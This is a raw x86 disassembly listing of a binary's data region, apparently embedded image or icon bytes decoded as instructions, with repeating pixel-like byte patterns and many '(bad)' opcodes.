  403418:	e3 01                	jecxz  0x40341b
  40341a:	57                   	push   %edi
  40341b:	79 d9                	jns    0x4033f6
  40341d:	01 32                	add    %esi,(%edx)
  40341f:	45                   	inc    %ebp
  403420:	bf 02 02 02 a0       	mov    $0xa0020202,%edi
  403425:	03 03                	add    (%ebx),%eax
  403427:	03 91 02 02 02 7c    	add    0x7c020202(%ecx),%edx
  40342d:	02 02                	add    (%edx),%al
  40342f:	02 65 03             	add    0x3(%ebp),%ah
  403432:	03 03                	add    (%ebx),%eax
  403434:	4c                   	dec    %esp
  403435:	00 00                	add    %al,(%eax)
  403437:	00 34 00             	add    %dh,(%eax,%eax,1)
  40343a:	00 00                	add    %al,(%eax)
  40343c:	24 00                	and    $0x0,%al
  40343e:	00 00                	add    %al,(%eax)
  403440:	1a 00                	sbb    (%eax),%al
  403442:	00 00                	add    %al,(%eax)
  403444:	10 00                	adc    %al,(%eax)
  403446:	00 00                	add    %al,(%eax)
  403448:	07                   	pop    %es
  403449:	00 00                	add    %al,(%eax)
  40344b:	00 01                	add    %al,(%ecx)
  40344d:	00 00                	add    %al,(%eax)
  40344f:	00 01                	add    %al,(%ecx)
	...
  4034cd:	00 86 ba 1f 22 a3    	add    %al,-0x5cdde046(%esi)
  4034d3:	d6                   	salc
  4034d4:	ff 67 c5             	jmp    *-0x3b(%edi)
  4034d7:	ec                   	in     (%dx),%al
  4034d8:	ff 27                	jmp    *(%edi)
  4034da:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4034db:	df ff                	(bad)
  4034dd:	0d 99 d2 ff 00       	or     $0xffd299,%eax
  4034e2:	92                   	xchg   %eax,%edx
  4034e3:	cc                   	int3
  4034e4:	ff 00                	incl   (%eax)
  4034e6:	76 a4                	jbe    0x40348c
  4034e8:	ee                   	out    %al,(%dx)
  4034e9:	01 5f 84             	add    %ebx,-0x7c(%edi)
  4034ec:	de 01                	fiadds (%ecx)
  4034ee:	3c 54                	cmp    $0x54,%al
  4034f0:	c6 02 0f             	movb   $0xf,(%edx)
  4034f3:	15 a8 03 03 03       	adc    $0x30303a8,%eax
  4034f8:	95                   	xchg   %eax,%ebp
  4034f9:	03 03                	add    (%ebx),%eax
  4034fb:	03 82 02 02 02 6c    	add    0x6c020202(%edx),%eax
  403501:	02 02                	add    (%edx),%al
  403503:	02 52 00             	add    0x0(%edx),%dl
  403506:	00 00                	add    %al,(%eax)
  403508:	3a 00                	cmp    (%eax),%al
  40350a:	00 00                	add    %al,(%eax)
  40350c:	28 00                	sub    %al,(%eax)
  40350e:	00 00                	add    %al,(%eax)
  403510:	1d 00 00 00 13       	sbb    $0x13000000,%eax
  403515:	00 00                	add    %al,(%eax)
  403517:	00 09                	add    %cl,(%ecx)
  403519:	00 00                	add    %al,(%eax)
  40351b:	00 02                	add    %al,(%edx)
  40351d:	00 00                	add    %al,(%eax)
  40351f:	00 01                	add    %al,(%ecx)
  403521:	00 00                	add    %al,(%eax)
  403523:	00 01                	add    %al,(%ecx)
	...
  40358d:	00 86 bb 9c 2d a8    	add    %al,-0x57d26345(%esi)
  403593:	d9 ff                	fcos
  403595:	a3 e2 ff ff 6b       	mov    %eax,0x6bffffe2
  40359a:	cc                   	int3
  40359b:	ff                   	(bad)
  40359c:	ff 6b cc             	ljmp   *-0x34(%ebx)
  40359f:	ff                   	(bad)
  4035a0:	ff 65 c9             	jmp    *-0x37(%ebp)
  4035a3:	fc                   	cld
  4035a4:	ff 4a bb             	decl   -0x45(%edx)
  4035a7:	ef                   	out    %eax,(%dx)
  4035a8:	ff 2f                	ljmp   *(%edi)
  4035aa:	ac                   	lods   %ds:(%esi),%al
  4035ab:	e2 ff                	loop   0x4035ac
  4035ad:	14 9e                	adc    $0x9e,%al
  4035af:	d6                   	salc
  4035b0:	ff 00                	incl   (%eax)
  4035b2:	92                   	xchg   %eax,%edx
  4035b3:	cc                   	int3
  4035b4:	ff 00                	incl   (%eax)
  4035b6:	7c ae                	jl     0x403566
  4035b8:	f3 01 66 8f          	repz add %esp,-0x71(%esi)
  4035bc:	e4 01                	in     $0x1,%al
  4035be:	45                   	inc    %ebp
  4035bf:	60                   	pusha
  4035c0:	cd 02                	int    $0x2
  4035c2:	1c 26                	sbb    $0x26,%al
  4035c4:	b0 02                	mov    $0x2,%al
  4035c6:	02 02                	add    (%edx),%al
  4035c8:	9a 03 03 03 8b 02 02 	lcall  $0x202,$0x8b030303
  4035cf:	02 73 02             	add    0x2(%ebx),%dh
  4035d2:	02 02                	add    (%edx),%al
  4035d4:	59                   	pop    %ecx
  4035d5:	00 00                	add    %al,(%eax)
  4035d7:	00 40 00             	add    %al,0x0(%eax)
  4035da:	00 00                	add    %al,(%eax)
  4035dc:	2c 00                	sub    $0x0,%al
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	1f                   	pop    %ds
  4035e1:	00 00                	add    %al,(%eax)
  4035e3:	00 15 00 00 00 0c    	add    %dl,0xc000000
  4035e9:	00 00                	add    %al,(%eax)
  4035eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4035ee:	00 00                	add    %al,(%eax)
  4035f0:	01 00                	add    %eax,(%eax)
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	01 00                	add    %eax,(%eax)
	...
  40364e:	8c c4                	mov    %es,%esp
  403650:	c7                   	(bad)
  403651:	2e a8 d9             	cs test $0xd9,%al
  403654:	ff a6 e4 ff ff 6e    	jmp    *0x6effffe4(%esi)
  40365a:	cf                   	iret
  40365b:	ff                   	(bad)
  40365c:	ff 6e cf             	ljmp   *-0x31(%esi)
  40365f:	ff                   	(bad)
  403660:	ff 6e cf             	ljmp   *-0x31(%esi)
  403663:	ff                   	(bad)
  403664:	ff 6e cf             	ljmp   *-0x31(%esi)
  403667:	ff                   	(bad)
  403668:	ff 6e cf             	ljmp   *-0x31(%esi)
  40366b:	ff                   	(bad)
  40366c:	ff 6e cf             	ljmp   *-0x31(%esi)
  40366f:	ff                   	(bad)
  403670:	ff 6e cf             	ljmp   *-0x31(%esi)
  403673:	ff                   	(bad)
  403674:	ff 53 c1             	call   *-0x3f(%ebx)
  403677:	f2 ff                	repnz (bad)
  403679:	38 b1 e6 ff 1c a2    	cmp    %dh,-0x5de3001a(%ecx)
  40367f:	d9 ff                	fcos
  403681:	07                   	pop    %es
  403682:	96                   	xchg   %eax,%esi
  403683:	cf                   	iret
  403684:	ff 00                	incl   (%eax)
  403686:	8c c2                	mov    %es,%edx
  403688:	fb                   	sti
  403689:	00 6f 9a             	add    %ch,-0x66(%edi)
  40368c:	e9 01 4e 6d d4       	jmp    0xd4ad8492
  403691:	01 28                	add    %ebp,(%eax)
  403693:	37                   	aaa
  403694:	b8 02 02 02 9d       	mov    $0x9d020202,%eax
  403699:	03 03                	add    (%ebx),%eax
  40369b:	03 91 02 02 02 7a    	add    0x7a020202(%ecx),%edx
  4036a1:	02 02                	add    (%edx),%al
  4036a3:	02 60 03             	add    0x3(%eax),%ah
  4036a6:	03 03                	add    (%ebx),%eax
  4036a8:	46                   	inc    %esi
  4036a9:	00 00                	add    %al,(%eax)
  4036ab:	00 31                	add    %dh,(%ecx)
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	00 23                	add    %ah,(%ebx)
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	00 18                	add    %bl,(%eax)
  4036b5:	00 00                	add    %al,(%eax)
  4036b7:	00 0e                	add    %cl,(%esi)
  4036b9:	00 00                	add    %al,(%eax)
  4036bb:	00 07                	add    %al,(%edi)
  4036bd:	00 00                	add    %al,(%eax)
  4036bf:	00 01                	add    %al,(%ecx)
  4036c1:	00 00                	add    %al,(%eax)
  4036c3:	00 01                	add    %al,(%ecx)
	...
  403709:	00 00                	add    %al,(%eax)
  40370b:	00 01                	add    %al,(%ecx)
  40370d:	00 8c c4 c7 2f a8 d9 	add    %cl,-0x2657d039(%esp,%eax,8)
  403714:	ff b7 ea ff ff 71    	push   0x71ffffea(%edi)
  40371a:	d2 ff                	sar    %cl,%bh
  40371c:	ff 71 d2             	push   -0x2e(%ecx)
  40371f:	ff                   	(bad)
  403720:	ff 71 d2             	push   -0x2e(%ecx)
  403723:	ff                   	(bad)
  403724:	ff 71 d2             	push   -0x2e(%ecx)
  403727:	ff                   	(bad)
  403728:	ff 71 d2             	push   -0x2e(%ecx)
  40372b:	ff                   	(bad)
  40372c:	ff 71 d2             	push   -0x2e(%ecx)
  40372f:	ff                   	(bad)
  403730:	ff 71 d2             	push   -0x2e(%ecx)
  403733:	ff                   	(bad)
  403734:	ff 71 d2             	push   -0x2e(%ecx)
  403737:	ff                   	(bad)
  403738:	ff 71 d2             	push   -0x2e(%ecx)
  40373b:	ff                   	(bad)
  40373c:	ff 71 d2             	push   -0x2e(%ecx)
  40373f:	ff                   	(bad)
  403740:	ff 71 d2             	push   -0x2e(%ecx)
  403743:	ff                   	(bad)
  403744:	ff 5c c7 f5          	lcall  *-0xb(%edi,%eax,8)
  403748:	ff 40 b6             	incl   -0x4a(%eax)
  40374b:	e9 ff 24 a7 dc       	jmp    0xdce75c4f
  403750:	ff 0e                	decl   (%esi)
  403752:	9a d2 ff 00 92 cc ff 	lcall  $0xffcc,$0x9200ffd2
  403759:	00 76 a4             	add    %dh,-0x5c(%esi)
  40375c:	ee                   	out    %al,(%dx)
  40375d:	01 57 79             	add    %edx,0x79(%edi)
  403760:	da 01                	fiaddl (%ecx)
  403762:	32 45 bf             	xor    -0x41(%ebp),%al
  403765:	02 10                	add    (%eax),%dl
  403767:	16                   	push   %ss
  403768:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403769:	03 03                	add    (%ebx),%eax
  40376b:	03 94 03 03 03 80 02 	add    0x2800303(%ebx,%eax,1),%edx
  403772:	02 02                	add    (%edx),%al
  403774:	66 03 03             	add    (%ebx),%ax
  403777:	03 4c 00 00          	add    0x0(%eax,%eax,1),%ecx
  40377b:	00 38                	add    %bh,(%eax)
  40377d:	00 00                	add    %al,(%eax)
  40377f:	00 26                	add    %ah,(%esi)
  403781:	00 00                	add    %al,(%eax)
  403783:	00 1b                	add    %bl,(%ebx)
  403785:	00 00                	add    %al,(%eax)
  403787:	00 12                	add    %dl,(%edx)
  403789:	00 00                	add    %al,(%eax)
  40378b:	00 09                	add    %cl,(%ecx)
  40378d:	00 00                	add    %al,(%eax)
  40378f:	00 02                	add    %al,(%edx)
	...
  4037c9:	00 00                	add    %al,(%eax)
  4037cb:	00 01                	add    %al,(%ecx)
  4037cd:	00 8c c4 c7 0c 98 cf 	add    %cl,-0x3067f339(%esp,%eax,8)
  4037d4:	ff                   	(bad)
  4037d5:	be ec ff ff 74       	mov    $0x74ffffec,%esi
  4037da:	d5 ff                	aad    $0xff
  4037dc:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037e0:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037e4:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037e8:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037ec:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037f0:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037f4:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037f8:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  4037fc:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  403800:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  403804:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  403808:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  40380c:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  403810:	ff 74 d5 ff          	push   -0x1(%ebp,%edx,8)
  403814:	ff 66 cd             	jmp    *-0x33(%esi)
  403817:	f9                   	stc
  403818:	ff 49 bd             	decl   -0x43(%ecx)
  40381b:	ec                   	in     (%dx),%al
  40381c:	ff 33                	push   (%ebx)
  40381e:	b0 e2                	mov    $0xe2,%al
  403820:	ff 16                	call   *(%esi)
  403822:	9f                   	lahf
  403823:	d6                   	salc
  403824:	ff 00                	incl   (%eax)
  403826:	92                   	xchg   %eax,%edx
  403827:	cc                   	int3
  403828:	ff 00                	incl   (%eax)
  40382a:	7c ae                	jl     0x4037da
  40382c:	f3 01 5f 84          	repz add %ebx,-0x7c(%edi)
  403830:	df 01                	filds  (%ecx)
  403832:	3c 54                	cmp    $0x54,%al
  403834:	c6 02 1d             	movb   $0x1d,(%edx)
  403837:	27                   	daa
  403838:	af                   	scas   %es:(%edi),%eax
  403839:	03 03                	add    (%ebx),%eax
  40383b:	03 98 03 03 03 86    	add    -0x79fcfcfd(%eax),%ebx
  403841:	02 02                	add    (%edx),%al
  403843:	02 6e 02             	add    0x2(%esi),%ch
  403846:	02 02                	add    (%edx),%al
  403848:	58                   	pop    %eax
  403849:	00 00                	add    %al,(%eax)
  40384b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40384e:	00 00                	add    %al,(%eax)
  403850:	1b 00                	sbb    (%eax),%eax
  403852:	00 00                	add    %al,(%eax)
  403854:	05 00 00 00 00       	add    $0x0,%eax
	...
  403889:	00 00                	add    %al,(%eax)
  40388b:	00 01                	add    %al,(%ecx)
  40388d:	00 8b c2 c9 00 92    	add    %cl,-0x6dff363e(%ebx)
  403893:	cc                   	int3
  403894:	ff c1                	inc    %ecx
  403896:	ed                   	in     (%dx),%eax
  403897:	ff                   	(bad)
  403898:	ff 77 d8             	push   -0x28(%edi)
  40389b:	ff                   	(bad)
  40389c:	ff 77 d8             	push   -0x28(%edi)
  40389f:	ff                   	(bad)
  4038a0:	ff 77 d8             	push   -0x28(%edi)
  4038a3:	ff                   	(bad)
  4038a4:	ff 77 d8             	push   -0x28(%edi)
  4038a7:	ff                   	(bad)
  4038a8:	ff 77 d8             	push   -0x28(%edi)
  4038ab:	ff                   	(bad)
  4038ac:	ff 77 d8             	push   -0x28(%edi)
  4038af:	ff                   	(bad)
  4038b0:	ff 77 d8             	push   -0x28(%edi)
  4038b3:	ff                   	(bad)
  4038b4:	ff 77 d8             	push   -0x28(%edi)
  4038b7:	ff                   	(bad)
  4038b8:	ff 77 d8             	push   -0x28(%edi)
  4038bb:	ff                   	(bad)
  4038bc:	ff 77 d8             	push   -0x28(%edi)
  4038bf:	ff                   	(bad)
  4038c0:	ff 77 d8             	push   -0x28(%edi)
  4038c3:	ff                   	(bad)
  4038c4:	ff 77 d8             	push   -0x28(%edi)
  4038c7:	ff                   	(bad)
  4038c8:	ff 77 d8             	push   -0x28(%edi)
  4038cb:	ff                   	(bad)
  4038cc:	ff 77 d8             	push   -0x28(%edi)
  4038cf:	ff                   	(bad)
  4038d0:	ff 77 d8             	push   -0x28(%edi)
  4038d3:	ff                   	(bad)
  4038d4:	ff 77 d8             	push   -0x28(%edi)
  4038d7:	ff                   	(bad)
  4038d8:	ff 77 d8             	push   -0x28(%edi)
  4038db:	ff                   	(bad)
  4038dc:	ff 77 d8             	push   -0x28(%edi)
  4038df:	ff                   	(bad)
  4038e0:	ff 77 d8             	push   -0x28(%edi)
  4038e3:	ff                   	(bad)
  4038e4:	ff 70 d4             	push   -0x2c(%eax)
  4038e7:	fc                   	cld
  4038e8:	ff 53 c3             	call   *-0x3d(%ebx)
  4038eb:	ef                   	out    %eax,(%dx)
  4038ec:	ff                   	(bad)
  4038ed:	3c b6                	cmp    $0xb6,%al
  4038ef:	e6 ff                	out    %al,$0xff
  4038f1:	1e                   	push   %ds
  4038f2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4038f3:	d9 ff                	fcos
  4038f5:	00 92 cc ff 00 84    	add    %dl,-0x7bff0034(%edx)
  4038fb:	b8 f7 01 66 8f       	mov    $0x8f6601f7,%eax
  403900:	e4 01                	in     $0x1,%al
  403902:	4f                   	dec    %edi
  403903:	6e                   	outsb  %ds:(%esi),(%dx)
  403904:	d2 01                	rolb   %cl,(%ecx)
  403906:	28 37                	sub    %dh,(%edi)
  403908:	b7 03                	mov    $0x3,%bh
  40390a:	03 03                	add    (%ebx),%eax
  40390c:	91                   	xchg   %eax,%ecx
  40390d:	02 02                	add    (%edx),%al
  40390f:	02 56 00             	add    0x0(%esi),%dl
  403912:	00 00                	add    %al,(%eax)
  403914:	14 00                	adc    $0x0,%al
  403916:	00 00                	add    %al,(%eax)
  403918:	01 00                	add    %eax,(%eax)
	...
  40394a:	00 00                	add    %al,(%eax)
  40394c:	01 00                	add    %eax,(%eax)
  40394e:	90                   	nop
  40394f:	ca f2 00             	lret   $0xf2
  403952:	92                   	xchg   %eax,%edx
  403953:	cc                   	int3
  403954:	ff c3                	inc    %ebx
  403956:	ed                   	in     (%dx),%eax
  403957:	ff                   	(bad)
  403958:	ff                   	(bad)
  403959:	7a dc                	jp     0x403937
  40395b:	ff                   	(bad)
  40395c:	ff                   	(bad)
  40395d:	7a dc                	jp     0x40393b
  40395f:	ff                   	(bad)
  403960:	ff                   	(bad)
  403961:	7a dc                	jp     0x40393f
  403963:	ff                   	(bad)
  403964:	ff                   	(bad)
  403965:	7a dc                	jp     0x403943
  403967:	ff                   	(bad)
  403968:	ff                   	(bad)
  403969:	7a dc                	jp     0x403947
  40396b:	ff                   	(bad)
  40396c:	ff                   	(bad)
  40396d:	7a dc                	jp     0x40394b
  40396f:	ff                   	(bad)
  403970:	ff                   	(bad)
  403971:	7a dc                	jp     0x40394f
  403973:	ff                   	(bad)
  403974:	ff                   	(bad)
  403975:	7a dc                	jp     0x403953
  403977:	ff                   	(bad)
  403978:	ff                   	(bad)
  403979:	7a dc                	jp     0x403957
  40397b:	ff                   	(bad)
  40397c:	ff                   	(bad)
  40397d:	7a dc                	jp     0x40395b
  40397f:	ff                   	(bad)
  403980:	ff                   	(bad)
  403981:	7a dc                	jp     0x40395f
  403983:	ff                   	(bad)
  403984:	ff                   	(bad)
  403985:	7a dc                	jp     0x403963
  403987:	ff                   	(bad)
  403988:	ff                   	(bad)
  403989:	7a dc                	jp     0x403967
  40398b:	ff                   	(bad)
  40398c:	ff                   	(bad)
  40398d:	7a dc                	jp     0x40396b
  40398f:	ff                   	(bad)
  403990:	ff                   	(bad)
  403991:	7a dc                	jp     0x40396f
  403993:	ff                   	(bad)
  403994:	ff                   	(bad)
  403995:	7a dc                	jp     0x403973
  403997:	ff                   	(bad)
  403998:	ff                   	(bad)
  403999:	7a dc                	jp     0x403977
  40399b:	ff                   	(bad)
  40399c:	ff                   	(bad)
  40399d:	7a dc                	jp     0x40397b
  40399f:	ff                   	(bad)
  4039a0:	ff                   	(bad)
  4039a1:	7a dc                	jp     0x40397f
  4039a3:	ff                   	(bad)
  4039a4:	ff                   	(bad)
  4039a5:	7a dc                	jp     0x403983
  4039a7:	ff                   	(bad)
  4039a8:	ff                   	(bad)
  4039a9:	7a dc                	jp     0x403987
  4039ab:	ff                   	(bad)
  4039ac:	ff                   	(bad)
  4039ad:	7a dc                	jp     0x40398b
  4039af:	ff                   	(bad)
  4039b0:	ff                   	(bad)
  4039b1:	7a dc                	jp     0x40398f
  4039b3:	ff                   	(bad)
  4039b4:	ff                   	(bad)
  4039b5:	7a dc                	jp     0x403993
  4039b7:	ff                   	(bad)
  4039b8:	ff 5c ca f2          	lcall  *-0xe(%edx,%ecx,8)
  4039bc:	ff 45 bd             	incl   -0x43(%ebp)
  4039bf:	e9 ff 26 aa dc       	jmp    0xdcea60c3
  4039c4:	ff 06                	incl   (%esi)
  4039c6:	95                   	xchg   %eax,%ebp
  4039c7:	cf                   	iret
  4039c8:	ff 01                	incl   (%ecx)
  4039ca:	60                   	pusha
  4039cb:	85 dd                	test   %ebx,%ebp
  4039cd:	02 02                	add    (%edx),%al
  4039cf:	02 77 00             	add    0x0(%edi),%dh
  4039d2:	00 00                	add    %al,(%eax)
  4039d4:	1e                   	push   %ds
  4039d5:	00 00                	add    %al,(%eax)
  4039d7:	00 01                	add    %al,(%ecx)
	...
  403a09:	00 00                	add    %al,(%eax)
  403a0b:	00 01                	add    %al,(%ecx)
  403a0d:	00 92 cc ff 00 92    	add    %dl,-0x6dff0034(%edx)
  403a13:	cc                   	int3
  403a14:	ff c6                	inc    %esi
  403a16:	ee                   	out    %al,(%dx)
  403a17:	ff                   	(bad)
  403a18:	ff 8b e2 ff ff 7d    	decl   0x7dffffe2(%ebx)
  403a1e:	df ff                	(bad)
  403a20:	ff                   	(bad)
  403a21:	7d df                	jge    0x403a02
  403a23:	ff                   	(bad)
  403a24:	ff                   	(bad)
  403a25:	7d df                	jge    0x403a06
  403a27:	ff                   	(bad)
  403a28:	ff                   	(bad)
  403a29:	7d df                	jge    0x403a0a
  403a2b:	ff                   	(bad)
  403a2c:	ff                   	(bad)
  403a2d:	7d df                	jge    0x403a0e
  403a2f:	ff                   	(bad)
  403a30:	ff                   	(bad)
  403a31:	7d df                	jge    0x403a12
  403a33:	ff                   	(bad)
  403a34:	ff                   	(bad)
  403a35:	7d df                	jge    0x403a16
  403a37:	ff                   	(bad)
  403a38:	ff                   	(bad)
  403a39:	7d df                	jge    0x403a1a
  403a3b:	ff                   	(bad)
  403a3c:	ff                   	(bad)
  403a3d:	7d df                	jge    0x403a1e
  403a3f:	ff                   	(bad)
  403a40:	ff                   	(bad)
  403a41:	7d df                	jge    0x403a22
  403a43:	ff                   	(bad)
  403a44:	ff                   	(bad)
  403a45:	7d df                	jge    0x403a26
  403a47:	ff                   	(bad)
  403a48:	ff                   	(bad)
  403a49:	7d df                	jge    0x403a2a
  403a4b:	ff                   	(bad)
  403a4c:	ff                   	(bad)
  403a4d:	7d df                	jge    0x403a2e
  403a4f:	ff                   	(bad)
  403a50:	ff                   	(bad)
  403a51:	7d df                	jge    0x403a32
  403a53:	ff                   	(bad)
  403a54:	ff                   	(bad)
  403a55:	7d df                	jge    0x403a36
  403a57:	ff                   	(bad)
  403a58:	ff                   	(bad)
  403a59:	7d df                	jge    0x403a3a
  403a5b:	ff                   	(bad)
  403a5c:	ff                   	(bad)
  403a5d:	7d df                	jge    0x403a3e
  403a5f:	ff                   	(bad)
  403a60:	ff                   	(bad)
  403a61:	7d df                	jge    0x403a42
  403a63:	ff                   	(bad)
  403a64:	ff                   	(bad)
  403a65:	7d df                	jge    0x403a46
  403a67:	ff                   	(bad)
  403a68:	ff                   	(bad)
  403a69:	7d df                	jge    0x403a4a
  403a6b:	ff                   	(bad)
  403a6c:	ff                   	(bad)
  403a6d:	7d df                	jge    0x403a4e
  403a6f:	ff                   	(bad)
  403a70:	ff                   	(bad)
  403a71:	7d df                	jge    0x403a52
  403a73:	ff                   	(bad)
  403a74:	ff                   	(bad)
  403a75:	7d df                	jge    0x403a56
  403a77:	ff                   	(bad)
  403a78:	ff                   	(bad)
  403a79:	7d df                	jge    0x403a5a
  403a7b:	ff                   	(bad)
  403a7c:	ff                   	(bad)
  403a7d:	7d df                	jge    0x403a5e
  403a7f:	ff                   	(bad)
  403a80:	ff                   	(bad)
  403a81:	7d df                	jge    0x403a62
  403a83:	ff                   	(bad)
  403a84:	ff 4d ba             	decl   -0x46(%ebp)
  403a87:	f2 ff 00             	repnz incl (%eax)
  403a8a:	76 a5                	jbe    0x403a31
  403a8c:	ed                   	in     (%dx),%eax
  403a8d:	03 03                	add    (%ebx),%eax
  403a8f:	03 84 00 00 00 23 00 	add    0x230000(%eax,%eax,1),%eax
  403a96:	00 00                	add    %al,(%eax)
  403a98:	01 00                	add    %eax,(%eax)
	...
  403aca:	00 00                	add    %al,(%eax)
  403acc:	01 00                	add    %eax,(%eax)
  403ace:	92                   	xchg   %eax,%edx
  403acf:	cc                   	int3
  403ad0:	ff 00                	incl   (%eax)
  403ad2:	92                   	xchg   %eax,%edx
  403ad3:	cc                   	int3
  403ad4:	ff a3 dd f5 ff 92    	jmp    *-0x6d000a23(%ebx)
  403ada:	e5 ff                	in     $0xff,%eax
  403adc:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403ae2:	e2 ff                	loop   0x403ae3
  403ae4:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403aea:	e2 ff                	loop   0x403aeb
  403aec:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403af2:	e2 ff                	loop   0x403af3
  403af4:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403afa:	e2 ff                	loop   0x403afb
  403afc:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b02:	e2 ff                	loop   0x403b03
  403b04:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b0a:	e2 ff                	loop   0x403b0b
  403b0c:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b12:	e2 ff                	loop   0x403b13
  403b14:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b1a:	e2 ff                	loop   0x403b1b
  403b1c:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b22:	e2 ff                	loop   0x403b23
  403b24:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b2a:	e2 ff                	loop   0x403b2b
  403b2c:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b32:	e2 ff                	loop   0x403b33
  403b34:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b3a:	e2 ff                	loop   0x403b3b
  403b3c:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  403b42:	e2 ff                	loop   0x403b43
  403b44:	ff 4d ba             	decl   -0x46(%ebp)
  403b47:	f2 ff 00             	repnz incl (%eax)
  403b4a:	7c ae                	jl     0x403afa
  403b4c:	f3 03 03             	repz add (%ebx),%eax
  403b4f:	03 91 00 00 00 2a    	add    0x2a000000(%ecx),%edx
  403b55:	00 00                	add    %al,(%eax)
  403b57:	00 01                	add    %al,(%ecx)
	...
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 03                	add    %al,(%ebx)
  403b8d:	24 a3                	and    $0xa3,%al
  403b8f:	d9 ff                	fcos
  403b91:	09 96 cf ff 99 d8    	or     %edx,-0x27660031(%esi)
  403b97:	f2 ff 95 e7 ff ff 83 	bnd call *-0x7c000019(%ebp)
  403b9e:	e5 ff                	in     $0xff,%eax
  403ba0:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403ba6:	e5 ff                	in     $0xff,%eax
  403ba8:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bae:	e5 ff                	in     $0xff,%eax
  403bb0:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bb6:	e5 ff                	in     $0xff,%eax
  403bb8:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bbe:	e5 ff                	in     $0xff,%eax
  403bc0:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bc6:	e5 ff                	in     $0xff,%eax
  403bc8:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bce:	e5 ff                	in     $0xff,%eax
  403bd0:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bd6:	e5 ff                	in     $0xff,%eax
  403bd8:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bde:	e5 ff                	in     $0xff,%eax
  403be0:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403be6:	e5 ff                	in     $0xff,%eax
  403be8:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bee:	e5 ff                	in     $0xff,%eax
  403bf0:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bf6:	e5 ff                	in     $0xff,%eax
  403bf8:	ff 83 e5 ff ff 83    	incl   -0x7c00001b(%ebx)
  403bfe:	e5 ff                	in     $0xff,%eax
  403c00:	ff 83 e5 ff ff 66    	incl   0x66ffffe5(%ebx)
  403c06:	c7                   	(bad)
  403c07:	ff                   	(bad)
  403c08:	ff 00                	incl   (%eax)
  403c0a:	92                   	xchg   %eax,%edx
  403c0b:	cc                   	int3
  403c0c:	ff 03                	incl   (%ebx)
  403c0e:	03 03                	add    (%ebx),%eax
  403c10:	99                   	cltd
  403c11:	00 00                	add    %al,(%eax)
  403c13:	00 34 00             	add    %dh,(%eax,%eax,1)
  403c16:	00 00                	add    %al,(%eax)
  403c18:	04 00                	add    $0x0,%al
	...
  403c4a:	00 00                	add    %al,(%eax)
  403c4c:	09 26                	or     %esp,(%esi)
  403c4e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403c4f:	d9 ff                	fcos
  403c51:	26 a4                	movsb  %es:(%esi),%es:(%edi)
  403c53:	d9 ff                	fcos
  403c55:	9b d8 f2             	fdiv   %st(2),%st
  403c58:	ff 98 ea ff ff 86    	lcall  *-0x79000016(%eax)
  403c5e:	e8 ff ff 86 e8       	call   0xe8c73c62
  403c63:	ff                   	(bad)
  403c64:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403c6a:	e8 ff ff 86 e8       	call   0xe8c73c6e
  403c6f:	ff                   	(bad)
  403c70:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403c76:	e8 ff ff 86 e8       	call   0xe8c73c7a
  403c7b:	ff                   	(bad)
  403c7c:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403c82:	e8 ff ff 86 e8       	call   0xe8c73c86
  403c87:	ff                   	(bad)
  403c88:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403c8e:	e8 ff ff 86 e8       	call   0xe8c73c92
  403c93:	ff                   	(bad)
  403c94:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403c9a:	e8 ff ff 86 e8       	call   0xe8c73c9e
